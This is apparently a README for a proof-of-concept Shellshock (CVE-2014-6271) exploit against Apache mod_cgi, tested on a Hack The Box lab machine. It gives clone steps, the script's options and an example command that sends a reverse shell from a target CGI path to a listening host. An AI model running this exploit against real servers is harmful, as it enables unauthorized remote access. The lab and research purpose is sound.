### shellshock_apache_mod_cgi

Proof of concept for [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/cve-2014-6271) exploit in Apache HTTP Server

Tested on [HTB: Shocker](https://app.hackthebox.com/machines/Shocker)

### Installation

Clone the GitHub repository and install python requirements:

```sh
git clone https://github.com/jb49088/poc.git \
    && cd poc/shellshock_apache_mod_cgi
```

### Usage

```
usage: exploit.py [-h] --path PATH --rhost RHOST --rport RPORT --lhost LHOST --lport LPORT

options:
  -h, --help     show this help message and exit
  --path PATH    Path to the target CGI script.
  --rhost RHOST  The target host.
  --rport RPORT  The target port.
  --lhost LHOST  The listen address for the payload.
  --lport LPORT  The listen port for the payload.
```

### Example

```sh
python exploit.py --path /cgi-bin/user.sh --rhost 10.10.10.1 --rport 80 --lhost 10.0.0.10 --lport 4444
```
